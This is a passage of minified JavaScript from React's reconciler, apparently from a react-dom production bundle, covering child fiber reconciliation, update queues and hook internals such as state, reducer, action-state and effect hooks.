        : ((o = Lu(y.type, y.key, y.props, null, r.mode, p)),
          Ja(o, y),
          (o.return = r),
          o);
    }
    function h(r, o, y, p) {
      return o === null ||
        o.tag !== 4 ||
        o.stateNode.containerInfo !== y.containerInfo ||
        o.stateNode.implementation !== y.implementation
        ? ((o = zi(y, r.mode, p)), (o.return = r), o)
        : ((o = u(o, y.children || [])), (o.return = r), o);
    }
    function b(r, o, y, p, U) {
      return o === null || o.tag !== 7
        ? ((o = Ce(y, r.mode, p, U)), (o.return = r), o)
        : ((o = u(o, y)), (o.return = r), o);
    }
    function x(r, o, y) {
      if (
        (typeof o == "string" && o !== "") ||
        typeof o == "number" ||
        typeof o == "bigint"
      )
        return (o = xi("" + o, r.mode, y)), (o.return = r), o;
      if (typeof o == "object" && o !== null) {
        switch (o.$$typeof) {
          case Ql:
            return (
              (y = Lu(o.type, o.key, o.props, null, r.mode, y)),
              Ja(y, o),
              (y.return = r),
              y
            );
          case Zl:
            return (o = zi(o, r.mode, y)), (o.return = r), o;
          case Nl:
            return (o = Be(o)), x(r, o, y);
        }
        if (kl(o) || Q(o))
          return (o = Ce(o, r.mode, y, null)), (o.return = r), o;
        if (typeof o.then == "function") return x(r, Wu(o), y);
        if (o.$$typeof === Ml) return x(r, Vu(r, o), y);
        ku(r, o);
      }
      return null;
    }
    function m(r, o, y, p) {
      var U = o !== null ? o.key : null;
      if (
        (typeof y == "string" && y !== "") ||
        typeof y == "number" ||
        typeof y == "bigint"
      )
        return U !== null ? null : f(r, o, "" + y, p);
      if (typeof y == "object" && y !== null) {
        switch (y.$$typeof) {
          case Ql:
            return y.key === U ? c(r, o, y, p) : null;
          case Zl:
            return y.key === U ? h(r, o, y, p) : null;
          case Nl:
            return (y = Be(y)), m(r, o, y, p);
        }
        if (kl(y) || Q(y)) return U !== null ? null : b(r, o, y, p, null);
        if (typeof y.then == "function") return m(r, o, Wu(y), p);
        if (y.$$typeof === Ml) return m(r, o, Vu(r, y), p);
        ku(r, y);
      }
      return null;
    }
    function g(r, o, y, p, U) {
      if (
        (typeof p == "string" && p !== "") ||
        typeof p == "number" ||
        typeof p == "bigint"
      )
        return (r = r.get(y) || null), f(o, r, "" + p, U);
      if (typeof p == "object" && p !== null) {
        switch (p.$$typeof) {
          case Ql:
            return (
              (r = r.get(p.key === null ? y : p.key) || null), c(o, r, p, U)
            );
          case Zl:
            return (
              (r = r.get(p.key === null ? y : p.key) || null), h(o, r, p, U)
            );
          case Nl:
            return (p = Be(p)), g(r, o, y, p, U);
        }
        if (kl(p) || Q(p)) return (r = r.get(y) || null), b(o, r, p, U, null);
        if (typeof p.then == "function") return g(r, o, y, Wu(p), U);
        if (p.$$typeof === Ml) return g(r, o, y, Vu(o, p), U);
        ku(o, p);
      }
      return null;
    }
    function M(r, o, y, p) {
      for (
        var U = null, P = null, C = o, Z = (o = 0), $ = null;
        C !== null && Z < y.length;
        Z++
      ) {
        C.index > Z ? (($ = C), (C = null)) : ($ = C.sibling);
        var ll = m(r, C, y[Z], p);
        if (ll === null) {
          C === null && (C = $);
          break;
        }
        l && C && ll.alternate === null && t(r, C),
          (o = n(ll, o, Z)),
          P === null ? (U = ll) : (P.sibling = ll),
          (P = ll),
          (C = $);
      }
      if (Z === y.length) return e(r, C), F && qt(r, Z), U;
      if (C === null) {
        for (; Z < y.length; Z++)
          (C = x(r, y[Z], p)),
            C !== null &&
              ((o = n(C, o, Z)),
              P === null ? (U = C) : (P.sibling = C),
              (P = C));
        return F && qt(r, Z), U;
      }
      for (C = a(C); Z < y.length; Z++)
        ($ = g(C, r, Z, y[Z], p)),
          $ !== null &&
            (l && $.alternate !== null && C.delete($.key === null ? Z : $.key),
            (o = n($, o, Z)),
            P === null ? (U = $) : (P.sibling = $),
            (P = $));
      return (
        l &&
          C.forEach(function (ze) {
            return t(r, ze);
          }),
        F && qt(r, Z),
        U
      );
    }
    function B(r, o, y, p) {
      if (y == null) throw Error(v(151));
      for (
        var U = null, P = null, C = o, Z = (o = 0), $ = null, ll = y.next();
        C !== null && !ll.done;
        Z++, ll = y.next()
      ) {
        C.index > Z ? (($ = C), (C = null)) : ($ = C.sibling);
        var ze = m(r, C, ll.value, p);
        if (ze === null) {
          C === null && (C = $);
          break;
        }
        l && C && ze.alternate === null && t(r, C),
          (o = n(ze, o, Z)),
          P === null ? (U = ze) : (P.sibling = ze),
          (P = ze),
          (C = $);
      }
      if (ll.done) return e(r, C), F && qt(r, Z), U;
      if (C === null) {
        for (; !ll.done; Z++, ll = y.next())
          (ll = x(r, ll.value, p)),
            ll !== null &&
              ((o = n(ll, o, Z)),
              P === null ? (U = ll) : (P.sibling = ll),
              (P = ll));
        return F && qt(r, Z), U;
      }
      for (C = a(C); !ll.done; Z++, ll = y.next())
        (ll = g(C, r, Z, ll.value, p)),
          ll !== null &&
            (l &&
              ll.alternate !== null &&
              C.delete(ll.key === null ? Z : ll.key),
            (o = n(ll, o, Z)),
            P === null ? (U = ll) : (P.sibling = ll),
            (P = ll));
      return (
        l &&
          C.forEach(function (kr) {
            return t(r, kr);
          }),
        F && qt(r, Z),
        U
      );
    }
    function cl(r, o, y, p) {
      if (
        (typeof y == "object" &&
          y !== null &&
          y.type === Cl &&
          y.key === null &&
          (y = y.props.children),
        typeof y == "object" && y !== null)
      ) {
        switch (y.$$typeof) {
          case Ql:
            l: {
              for (var U = y.key; o !== null; ) {
                if (o.key === U) {
                  if (((U = y.type), U === Cl)) {
                    if (o.tag === 7) {
                      e(r, o.sibling),
                        (p = u(o, y.props.children)),
                        (p.return = r),
                        (r = p);
                      break l;
                    }
                  } else if (
                    o.elementType === U ||
                    (typeof U == "object" &&
                      U !== null &&
                      U.$$typeof === Nl &&
                      Be(U) === o.type)
                  ) {
                    e(r, o.sibling),
                      (p = u(o, y.props)),
                      Ja(p, y),
                      (p.return = r),
                      (r = p);
                    break l;
                  }
                  e(r, o);
                  break;
                } else t(r, o);
                o = o.sibling;
              }
              y.type === Cl
                ? ((p = Ce(y.props.children, r.mode, p, y.key)),
                  (p.return = r),
                  (r = p))
                : ((p = Lu(y.type, y.key, y.props, null, r.mode, p)),
                  Ja(p, y),
                  (p.return = r),
                  (r = p));
            }
            return i(r);
          case Zl:
            l: {
              for (U = y.key; o !== null; ) {
                if (o.key === U)
                  if (
                    o.tag === 4 &&
                    o.stateNode.containerInfo === y.containerInfo &&
                    o.stateNode.implementation === y.implementation
                  ) {
                    e(r, o.sibling),
                      (p = u(o, y.children || [])),
                      (p.return = r),
                      (r = p);
                    break l;
                  } else {
                    e(r, o);
                    break;
                  }
                else t(r, o);
                o = o.sibling;
              }
              (p = zi(y, r.mode, p)), (p.return = r), (r = p);
            }
            return i(r);
          case Nl:
            return (y = Be(y)), cl(r, o, y, p);
        }
        if (kl(y)) return M(r, o, y, p);
        if (Q(y)) {
          if (((U = Q(y)), typeof U != "function")) throw Error(v(150));
          return (y = U.call(y)), B(r, o, y, p);
        }
        if (typeof y.then == "function") return cl(r, o, Wu(y), p);
        if (y.$$typeof === Ml) return cl(r, o, Vu(r, y), p);
        ku(r, y);
      }
      return (typeof y == "string" && y !== "") ||
        typeof y == "number" ||
        typeof y == "bigint"
        ? ((y = "" + y),
          o !== null && o.tag === 6
            ? (e(r, o.sibling), (p = u(o, y)), (p.return = r), (r = p))
            : (e(r, o), (p = xi(y, r.mode, p)), (p.return = r), (r = p)),
          i(r))
        : e(r, o);
    }
    return function (r, o, y, p) {
      try {
        Ka = 0;
        var U = cl(r, o, y, p);
        return (sa = null), U;
      } catch (C) {
        if (C === ca || C === Ju) throw C;
        var P = ft(29, C, null, r.mode);
        return (P.lanes = p), (P.return = r), P;
      } finally {
      }
    };
  }
  var qe = Ms(!0),
    _s = Ms(!1),
    ne = !1;
  function Ri(l) {
    l.updateQueue = {
      baseState: l.memoizedState,
      firstBaseUpdate: null,
      lastBaseUpdate: null,
      shared: { pending: null, lanes: 0, hiddenCallbacks: null },
      callbacks: null,
    };
  }
  function Bi(l, t) {
    (l = l.updateQueue),
      t.updateQueue === l &&
        (t.updateQueue = {
          baseState: l.baseState,
          firstBaseUpdate: l.firstBaseUpdate,
          lastBaseUpdate: l.lastBaseUpdate,
          shared: l.shared,
          callbacks: null,
        });
  }
  function ie(l) {
    return { lane: l, tag: 0, payload: null, callback: null, next: null };
  }
  function fe(l, t, e) {
    var a = l.updateQueue;
    if (a === null) return null;
    if (((a = a.shared), (tl & 2) !== 0)) {
      var u = a.pending;
      return (
        u === null ? (t.next = t) : ((t.next = u.next), (u.next = t)),
        (a.pending = t),
        (t = Xu(l)),
        ds(l, null, e),
        t
      );
    }
    return Gu(l, a, t, e), Xu(l);
  }
  function wa(l, t, e) {
    if (
      ((t = t.updateQueue), t !== null && ((t = t.shared), (e & 4194048) !== 0))
    ) {
      var a = t.lanes;
      (a &= l.pendingLanes), (e |= a), (t.lanes = e), bc(l, e);
    }
  }
  function Ni(l, t) {
    var e = l.updateQueue,
      a = l.alternate;
    if (a !== null && ((a = a.updateQueue), e === a)) {
      var u = null,
        n = null;
      if (((e = e.firstBaseUpdate), e !== null)) {
        do {
          var i = {
            lane: e.lane,
            tag: e.tag,
            payload: e.payload,
            callback: null,
            next: null,
          };
          n === null ? (u = n = i) : (n = n.next = i), (e = e.next);
        } while (e !== null);
        n === null ? (u = n = t) : (n = n.next = t);
      } else u = n = t;
      (e = {
        baseState: a.baseState,
        firstBaseUpdate: u,
        lastBaseUpdate: n,
        shared: a.shared,
        callbacks: a.callbacks,
      }),
        (l.updateQueue = e);
      return;
    }
    (l = e.lastBaseUpdate),
      l === null ? (e.firstBaseUpdate = t) : (l.next = t),
      (e.lastBaseUpdate = t);
  }
  var qi = !1;
  function Wa() {
    if (qi) {
      var l = fa;
      if (l !== null) throw l;
    }
  }
  function ka(l, t, e, a) {
    qi = !1;
    var u = l.updateQueue;
    ne = !1;
    var n = u.firstBaseUpdate,
      i = u.lastBaseUpdate,
      f = u.shared.pending;
    if (f !== null) {
      u.shared.pending = null;
      var c = f,
        h = c.next;
      (c.next = null), i === null ? (n = h) : (i.next = h), (i = c);
      var b = l.alternate;
      b !== null &&
        ((b = b.updateQueue),
        (f = b.lastBaseUpdate),
        f !== i &&
          (f === null ? (b.firstBaseUpdate = h) : (f.next = h),
          (b.lastBaseUpdate = c)));
    }
    if (n !== null) {
      var x = u.baseState;
      (i = 0), (b = h = c = null), (f = n);
      do {
        var m = f.lane & -536870913,
          g = m !== f.lane;
        if (g ? (k & m) === m : (a & m) === m) {
          m !== 0 && m === ia && (qi = !0),
            b !== null &&
              (b = b.next =
                {
                  lane: 0,
                  tag: f.tag,
                  payload: f.payload,
                  callback: null,
                  next: null,
                });
          l: {
            var M = l,
              B = f;
            m = t;
            var cl = e;
            switch (B.tag) {
              case 1:
                if (((M = B.payload), typeof M == "function")) {
                  x = M.call(cl, x, m);
                  break l;
                }
                x = M;
                break l;
              case 3:
                M.flags = (M.flags & -65537) | 128;
              case 0:
                if (
                  ((M = B.payload),
                  (m = typeof M == "function" ? M.call(cl, x, m) : M),
                  m == null)
                )
                  break l;
                x = R({}, x, m);
                break l;
              case 2:
                ne = !0;
            }
          }
          (m = f.callback),
            m !== null &&
              ((l.flags |= 64),
              g && (l.flags |= 8192),
              (g = u.callbacks),
              g === null ? (u.callbacks = [m]) : g.push(m));
        } else
          (g = {
            lane: m,
            tag: f.tag,
            payload: f.payload,
            callback: f.callback,
            next: null,
          }),
            b === null ? ((h = b = g), (c = x)) : (b = b.next = g),
            (i |= m);
        if (((f = f.next), f === null)) {
          if (((f = u.shared.pending), f === null)) break;
          (g = f),
            (f = g.next),
            (g.next = null),
            (u.lastBaseUpdate = g),
            (u.shared.pending = null);
        }
      } while (!0);
      b === null && (c = x),
        (u.baseState = c),
        (u.firstBaseUpdate = h),
        (u.lastBaseUpdate = b),
        n === null && (u.shared.lanes = 0),
        (re |= i),
        (l.lanes = i),
        (l.memoizedState = x);
    }
  }
  function Os(l, t) {
    if (typeof l != "function") throw Error(v(191, l));
    l.call(t);
  }
  function Cs(l, t) {
    var e = l.callbacks;
    if (e !== null)
      for (l.callbacks = null, l = 0; l < e.length; l++) Os(e[l], t);
  }
  var oa = d(null),
    $u = d(0);
  function Ds(l, t) {
    (l = Wt), j($u, l), j(oa, t), (Wt = l | t.baseLanes);
  }
  function Yi() {
    j($u, Wt), j(oa, oa.current);
  }
  function Gi() {
    (Wt = $u.current), z(oa), z($u);
  }
  var ct = d(null),
    zt = null;
  function ce(l) {
    var t = l.alternate;
    j(xl, xl.current & 1),
      j(ct, l),
      zt === null &&
        (t === null || oa.current !== null || t.memoizedState !== null) &&
        (zt = l);
  }
  function Xi(l) {
    j(xl, xl.current), j(ct, l), zt === null && (zt = l);
  }
  function Us(l) {
    l.tag === 22
      ? (j(xl, xl.current), j(ct, l), zt === null && (zt = l))
      : se();
  }
  function se() {
    j(xl, xl.current), j(ct, ct.current);
  }
  function st(l) {
    z(ct), zt === l && (zt = null), z(xl);
  }
  var xl = d(0);
  function Fu(l) {
    for (var t = l; t !== null; ) {
      if (t.tag === 13) {
        var e = t.memoizedState;
        if (e !== null && ((e = e.dehydrated), e === null || wf(e) || Wf(e)))
          return t;
      } else if (
        t.tag === 19 &&
        (t.memoizedProps.revealOrder === "forwards" ||
          t.memoizedProps.revealOrder === "backwards" ||
          t.memoizedProps.revealOrder === "unstable_legacy-backwards" ||
          t.memoizedProps.revealOrder === "together")
      ) {
        if ((t.flags & 128) !== 0) return t;
      } else if (t.child !== null) {
        (t.child.return = t), (t = t.child);
        continue;
      }
      if (t === l) break;
      for (; t.sibling === null; ) {
        if (t.return === null || t.return === l) return null;
        t = t.return;
      }
      (t.sibling.return = t.return), (t = t.sibling);
    }
    return null;
  }
  var Xt = 0,
    L = null,
    il = null,
    El = null,
    Iu = !1,
    da = !1,
    Ye = !1,
    Pu = 0,
    $a = 0,
    ra = null,
    G1 = 0;
  function gl() {
    throw Error(v(321));
  }
  function Li(l, t) {
    if (t === null) return !1;
    for (var e = 0; e < t.length && e < l.length; e++)
      if (!it(l[e], t[e])) return !1;
    return !0;
  }
  function Qi(l, t, e, a, u, n) {
    return (
      (Xt = n),
      (L = t),
      (t.memoizedState = null),
      (t.updateQueue = null),
      (t.lanes = 0),
      (S.H = l === null || l.memoizedState === null ? mo : af),
      (Ye = !1),
      (n = e(a, u)),
      (Ye = !1),
      da && (n = Rs(t, e, a, u)),
      Hs(l),
      n
    );
  }
  function Hs(l) {
    S.H = Pa;
    var t = il !== null && il.next !== null;
    if (((Xt = 0), (El = il = L = null), (Iu = !1), ($a = 0), (ra = null), t))
      throw Error(v(300));
    l === null ||
      Al ||
      ((l = l.dependencies), l !== null && Zu(l) && (Al = !0));
  }
  function Rs(l, t, e, a) {
    L = l;
    var u = 0;
    do {
      if ((da && (ra = null), ($a = 0), (da = !1), 25 <= u))
        throw Error(v(301));
      if (((u += 1), (El = il = null), l.updateQueue != null)) {
        var n = l.updateQueue;
        (n.lastEffect = null),
          (n.events = null),
          (n.stores = null),
          n.memoCache != null && (n.memoCache.index = 0);
      }
      (S.H = go), (n = t(e, a));
    } while (da);
    return n;
  }
  function X1() {
    var l = S.H,
      t = l.useState()[0];
    return (
      (t = typeof t.then == "function" ? Fa(t) : t),
      (l = l.useState()[0]),
      (il !== null ? il.memoizedState : null) !== l && (L.flags |= 1024),
      t
    );
  }
  function Zi() {
    var l = Pu !== 0;
    return (Pu = 0), l;
  }
  function Vi(l, t, e) {
    (t.updateQueue = l.updateQueue), (t.flags &= -2053), (l.lanes &= ~e);
  }
  function Ki(l) {
    if (Iu) {
      for (l = l.memoizedState; l !== null; ) {
        var t = l.queue;
        t !== null && (t.pending = null), (l = l.next);
      }
      Iu = !1;
    }
    (Xt = 0), (El = il = L = null), (da = !1), ($a = Pu = 0), (ra = null);
  }
  function Wl() {
    var l = {
      memoizedState: null,
      baseState: null,
      baseQueue: null,
      queue: null,
      next: null,
    };
    return El === null ? (L.memoizedState = El = l) : (El = El.next = l), El;
  }
  function zl() {
    if (il === null) {
      var l = L.alternate;
      l = l !== null ? l.memoizedState : null;
    } else l = il.next;
    var t = El === null ? L.memoizedState : El.next;
    if (t !== null) (El = t), (il = l);
    else {
      if (l === null)
        throw L.alternate === null ? Error(v(467)) : Error(v(310));
      (il = l),
        (l = {
          memoizedState: il.memoizedState,
          baseState: il.baseState,
          baseQueue: il.baseQueue,
          queue: il.queue,
          next: null,
        }),
        El === null ? (L.memoizedState = El = l) : (El = El.next = l);
    }
    return El;
  }
  function ln() {
    return { lastEffect: null, events: null, stores: null, memoCache: null };
  }
  function Fa(l) {
    var t = $a;
    return (
      ($a += 1),
      ra === null && (ra = []),
      (l = Es(ra, l, t)),
      (t = L),
      (El === null ? t.memoizedState : El.next) === null &&
        ((t = t.alternate),
        (S.H = t === null || t.memoizedState === null ? mo : af)),
      l
    );
  }
  function tn(l) {
    if (l !== null && typeof l == "object") {
      if (typeof l.then == "function") return Fa(l);
      if (l.$$typeof === Ml) return Gl(l);
    }
    throw Error(v(438, String(l)));
  }
  function Ji(l) {
    var t = null,
      e = L.updateQueue;
    if ((e !== null && (t = e.memoCache), t == null)) {
      var a = L.alternate;
      a !== null &&
        ((a = a.updateQueue),
        a !== null &&
          ((a = a.memoCache),
          a != null &&
            (t = {
              data: a.data.map(function (u) {
                return u.slice();
              }),
              index: 0,
            })));
    }
    if (
      (t == null && (t = { data: [], index: 0 }),
      e === null && ((e = ln()), (L.updateQueue = e)),
      (e.memoCache = t),
      (e = t.data[t.index]),
      e === void 0)
    )
      for (e = t.data[t.index] = Array(l), a = 0; a < l; a++) e[a] = Ft;
    return t.index++, e;
  }
  function Lt(l, t) {
    return typeof t == "function" ? t(l) : t;
  }
  function en(l) {
    var t = zl();
    return wi(t, il, l);
  }
  function wi(l, t, e) {
    var a = l.queue;
    if (a === null) throw Error(v(311));
    a.lastRenderedReducer = e;
    var u = l.baseQueue,
      n = a.pending;
    if (n !== null) {
      if (u !== null) {
        var i = u.next;
        (u.next = n.next), (n.next = i);
      }
      (t.baseQueue = u = n), (a.pending = null);
    }
    if (((n = l.baseState), u === null)) l.memoizedState = n;
    else {
      t = u.next;
      var f = (i = null),
        c = null,
        h = t,
        b = !1;
      do {
        var x = h.lane & -536870913;
        if (x !== h.lane ? (k & x) === x : (Xt & x) === x) {
          var m = h.revertLane;
          if (m === 0)
            c !== null &&
              (c = c.next =
                {
                  lane: 0,
                  revertLane: 0,
                  gesture: null,
                  action: h.action,
                  hasEagerState: h.hasEagerState,
                  eagerState: h.eagerState,
                  next: null,
                }),
              x === ia && (b = !0);
          else if ((Xt & m) === m) {
            (h = h.next), m === ia && (b = !0);
            continue;
          } else
            (x = {
              lane: 0,
              revertLane: h.revertLane,
              gesture: null,
              action: h.action,
              hasEagerState: h.hasEagerState,
              eagerState: h.eagerState,
              next: null,
            }),
              c === null ? ((f = c = x), (i = n)) : (c = c.next = x),
              (L.lanes |= m),
              (re |= m);
          (x = h.action),
            Ye && e(n, x),
            (n = h.hasEagerState ? h.eagerState : e(n, x));
        } else
          (m = {
            lane: x,
            revertLane: h.revertLane,
            gesture: h.gesture,
            action: h.action,
            hasEagerState: h.hasEagerState,
            eagerState: h.eagerState,
            next: null,
          }),
            c === null ? ((f = c = m), (i = n)) : (c = c.next = m),
            (L.lanes |= x),
            (re |= x);
        h = h.next;
      } while (h !== null && h !== t);
      if (
        (c === null ? (i = n) : (c.next = f),
        !it(n, l.memoizedState) && ((Al = !0), b && ((e = fa), e !== null)))
      )
        throw e;
      (l.memoizedState = n),
        (l.baseState = i),
        (l.baseQueue = c),
        (a.lastRenderedState = n);
    }
    return u === null && (a.lanes = 0), [l.memoizedState, a.dispatch];
  }
  function Wi(l) {
    var t = zl(),
      e = t.queue;
    if (e === null) throw Error(v(311));
    e.lastRenderedReducer = l;
    var a = e.dispatch,
      u = e.pending,
      n = t.memoizedState;
    if (u !== null) {
      e.pending = null;
      var i = (u = u.next);
      do (n = l(n, i.action)), (i = i.next);
      while (i !== u);
      it(n, t.memoizedState) || (Al = !0),
        (t.memoizedState = n),
        t.baseQueue === null && (t.baseState = n),
        (e.lastRenderedState = n);
    }
    return [n, a];
  }
  function Bs(l, t, e) {
    var a = L,
      u = zl(),
      n = F;
    if (n) {
      if (e === void 0) throw Error(v(407));
      e = e();
    } else e = t();
    var i = !it((il || u).memoizedState, e);
    if (
      (i && ((u.memoizedState = e), (Al = !0)),
      (u = u.queue),
      Fi(Ys.bind(null, a, u, l), [l]),
      u.getSnapshot !== t || i || (El !== null && El.memoizedState.tag & 1))
    ) {
      if (
        ((a.flags |= 2048),
        ya(9, { destroy: void 0 }, qs.bind(null, a, u, e, t), null),
        dl === null)
      )
        throw Error(v(349));
      n || (Xt & 127) !== 0 || Ns(a, t, e);
    }
    return e;
  }
  function Ns(l, t, e) {
    (l.flags |= 16384),
      (l = { getSnapshot: t, value: e }),
      (t = L.updateQueue),
      t === null
        ? ((t = ln()), (L.updateQueue = t), (t.stores = [l]))
        : ((e = t.stores), e === null ? (t.stores = [l]) : e.push(l));
  }
  function qs(l, t, e, a) {
    (t.value = e), (t.getSnapshot = a), Gs(t) && Xs(l);
  }
  function Ys(l, t, e) {
    return e(function () {
      Gs(t) && Xs(l);
    });
  }
  function Gs(l) {
    var t = l.getSnapshot;
    l = l.value;
    try {
      var e = t();
      return !it(l, e);
    } catch {
      return !0;
    }
  }
  function Xs(l) {
    var t = Oe(l, 2);
    t !== null && et(t, l, 2);
  }
  function ki(l) {
    var t = Wl();
    if (typeof l == "function") {
      var e = l;
      if (((l = e()), Ye)) {
        It(!0);
        try {
          e();
        } finally {
          It(!1);
        }
      }
    }
    return (
      (t.memoizedState = t.baseState = l),
      (t.queue = {
        pending: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: Lt,
        lastRenderedState: l,
      }),
      t
    );
  }
  function Ls(l, t, e, a) {
    return (l.baseState = e), wi(l, il, typeof a == "function" ? a : Lt);
  }
  function L1(l, t, e, a, u) {
    if (nn(l)) throw Error(v(485));
    if (((l = t.action), l !== null)) {
      var n = {
        payload: u,
        action: l,
        next: null,
        isTransition: !0,
        status: "pending",
        value: null,
        reason: null,
        listeners: [],
        then: function (i) {
          n.listeners.push(i);
        },
      };
      S.T !== null ? e(!0) : (n.isTransition = !1),
        a(n),
        (e = t.pending),
        e === null
          ? ((n.next = t.pending = n), Qs(t, n))
          : ((n.next = e.next), (t.pending = e.next = n));
    }
  }
  function Qs(l, t) {
    var e = t.action,
      a = t.payload,
      u = l.state;
    if (t.isTransition) {
      var n = S.T,
        i = {};
      S.T = i;
      try {
        var f = e(u, a),
          c = S.S;
        c !== null && c(i, f), Zs(l, t, f);
      } catch (h) {
        $i(l, t, h);
      } finally {
        n !== null && i.types !== null && (n.types = i.types), (S.T = n);
      }
    } else
      try {
        (n = e(u, a)), Zs(l, t, n);
      } catch (h) {
        $i(l, t, h);
      }
  }
  function Zs(l, t, e) {
    e !== null && typeof e == "object" && typeof e.then == "function"
      ? e.then(
          function (a) {
            Vs(l, t, a);
          },
          function (a) {
            return $i(l, t, a);
          }
        )
      : Vs(l, t, e);
  }
  function Vs(l, t, e) {
    (t.status = "fulfilled"),
      (t.value = e),
      Ks(t),
      (l.state = e),
      (t = l.pending),
      t !== null &&
        ((e = t.next),
        e === t ? (l.pending = null) : ((e = e.next), (t.next = e), Qs(l, e)));
  }
  function $i(l, t, e) {
    var a = l.pending;
    if (((l.pending = null), a !== null)) {
      a = a.next;
      do (t.status = "rejected"), (t.reason = e), Ks(t), (t = t.next);
      while (t !== a);
    }
    l.action = null;
  }
  function Ks(l) {
    l = l.listeners;
    for (var t = 0; t < l.length; t++) (0, l[t])();
  }
  function Js(l, t) {
    return t;
  }
  function ws(l, t) {
    if (F) {
      var e = dl.formState;
      if (e !== null) {
        l: {
          var a = L;
          if (F) {
            if (yl) {
              t: {
                for (var u = yl, n = xt; u.nodeType !== 8; ) {
                  if (!n) {
                    u = null;
                    break t;
                  }
                  if (((u = Tt(u.nextSibling)), u === null)) {
                    u = null;
                    break t;
                  }
                }
                (n = u.data), (u = n === "F!" || n === "F" ? u : null);
              }
              if (u) {
                (yl = Tt(u.nextSibling)), (a = u.data === "F!");
                break l;
              }
            }
            ae(a);
          }
          a = !1;
        }
        a && (t = e[0]);
      }
    }
    return (
      (e = Wl()),
      (e.memoizedState = e.baseState = t),
      (a = {
        pending: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: Js,
        lastRenderedState: t,
      }),
      (e.queue = a),
      (e = yo.bind(null, L, a)),
      (a.dispatch = e),
      (a = ki(!1)),
      (n = ef.bind(null, L, !1, a.queue)),
      (a = Wl()),
      (u = { state: t, dispatch: null, action: l, pending: null }),
      (a.queue = u),
      (e = L1.bind(null, L, u, n, e)),
      (u.dispatch = e),
      (a.memoizedState = l),
      [t, e, !1]
    );
  }
  function Ws(l) {
    var t = zl();
    return ks(t, il, l);
  }
  function ks(l, t, e) {
    if (
      ((t = wi(l, t, Js)[0]),
      (l = en(Lt)[0]),
      typeof t == "object" && t !== null && typeof t.then == "function")
    )
      try {
        var a = Fa(t);
      } catch (i) {
        throw i === ca ? Ju : i;
      }
    else a = t;
    t = zl();
    var u = t.queue,
      n = u.dispatch;
    return (
      e !== t.memoizedState &&
        ((L.flags |= 2048),
        ya(9, { destroy: void 0 }, Q1.bind(null, u, e), null)),
      [a, n, l]
    );
  }
  function Q1(l, t) {
    l.action = t;
  }
  function $s(l) {
    var t = zl(),
      e = il;
    if (e !== null) return ks(t, e, l);
    zl(), (t = t.memoizedState), (e = zl());
    var a = e.queue.dispatch;
    return (e.memoizedState = l), [t, a, !1];
  }
  function ya(l, t, e, a) {
    return (
      (l = { tag: l, create: e, deps: a, inst: t, next: null }),
      (t = L.updateQueue),
      t === null && ((t = ln()), (L.updateQueue = t)),
      (e = t.lastEffect),
      e === null
        ? (t.lastEffect = l.next = l)
        : ((a = e.next), (e.next = l), (l.next = a), (t.lastEffect = l)),
      l
    );
  }
  function Fs() {
    return zl().memoizedState;
  }
  function an(l, t, e, a) {
    var u = Wl();
    (L.flags |= l),
      (u.memoizedState = ya(
        1 | t,
        { destroy: void 0 },
        e,
        a === void 0 ? null : a
      ));
  }
  function un(l, t, e, a) {
    var u = zl();
    a = a === void 0 ? null : a;
    var n = u.memoizedState.inst;
    il !== null && a !== null && Li(a, il.memoizedState.deps)
      ? (u.memoizedState = ya(t, n, e, a))
      : ((L.flags |= l), (u.memoizedState = ya(1 | t, n, e, a)));
  }
  function Is(l, t) {
    an(8390656, 8, l, t);
  }
  function Fi(l, t) {
    un(2048, 8, l, t);
  }
  function Z1(l) {
    L.flags |= 4;
    var t = L.updateQueue;
    if (t === null) (t = ln()), (L.updateQueue = t), (t.events = [l]);
    else {
      var e = t.events;
      e === null ? (t.events = [l]) : e.push(l);
    }
  }
  function Ps(l) {
    var t = zl().memoizedState;
    return (
      Z1({ ref: t, nextImpl: l }),
      function () {
        if ((tl & 2) !== 0) throw Error(v(440));
        return t.impl.apply(void 0, arguments);
      }
    );
  }
  function lo(l, t) {
    return un(4, 2, l, t);
  }
  function to(l, t) {
    return un(4, 4, l, t);
  }
  function eo(l, t) {
    if (typeof t == "function") {
      l = l();
      var e = t(l);
      return function () {
        typeof e == "function" ? e() : t(null);
      };
    }
    if (t != null)
      return (
        (l = l()),
        (t.current = l),
        function () {
          t.current = null;
        }
      );
  }
  function ao(l, t, e) {
    (e = e != null ? e.concat([l]) : null), un(4, 4, eo.bind(null, t, l), e);
  }
  function Ii() {}
  function uo(l, t) {
    var e = zl();
    t = t === void 0 ? null : t;
    var a = e.memoizedState;
    return t !== null && Li(t, a[1]) ? a[0] : ((e.memoizedState = [l, t]), l);
  }
  function no(l, t) {
    var e = zl();
    t = t === void 0 ? null : t;
    var a = e.memoizedState;
    if (t !== null && Li(t, a[1])) return a[0];
    if (((a = l()), Ye)) {
      It(!0);
      try {
        l();
      } finally {
        It(!1);
      }
    }
    return (e.memoizedState = [a, t]), a;
  }
  function Pi(l, t, e) {
    return e === void 0 || ((Xt & 1073741824) !== 0 && (k & 261930) === 0)
      ? (l.memoizedState = t)
      : ((l.memoizedState = e), (l = fd()), (L.lanes |= l), (re |= l), e);
  }
  function io(l, t, e, a) {
    return it(e, t)
      ? e
      : oa.current !== null
      ? ((l = Pi(l, e, a)), it(l, t) || (Al = !0), l)
      : (Xt & 42) === 0 || ((Xt & 1073741824) !== 0 && (k & 261930) === 0)
      ? ((Al = !0), (l.memoizedState = e))
      : ((l = fd()), (L.lanes |= l), (re |= l), t);
  }
  function fo(l, t, e, a, u) {
    var n = A.p;
    A.p = n !== 0 && 8 > n ? n : 8;
    var i = S.T,
      f = {};
    (S.T = f), ef(l, !1, t, e);
    try {
      var c = u(),
        h = S.S;
      if (
        (h !== null && h(f, c),
        c !== null && typeof c == "object" && typeof c.then == "function")
      ) {
        var b = Y1(c, a);
        Ia(l, t, b, rt(l));
      } else Ia(l, t, a, rt(l));
    } catch (x) {
      Ia(l, t, { then: function () {}, status: "rejected", reason: x }, rt());
    } finally {
      (A.p = n),
        i !== null && f.types !== null && (i.types = f.types),
        (S.T = i);
    }
  }
  function V1() {}
  function lf(l, t, e, a) {
    if (l.tag !== 5) throw Error(v(476));
    var u = co(l).queue;
    fo(
      l,
      u,
      t,
      N,
      e === null
        ? V1
        : function () {
            return so(l), e(a);
          }
    );
  }
  function co(l) {
    var t = l.memoizedState;
    if (t !== null) return t;
    t = {
      memoizedState: N,
      baseState: N,
      baseQueue: null,
      queue: {
        pending: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: Lt,
        lastRenderedState: N,
      },
      next: null,
    };
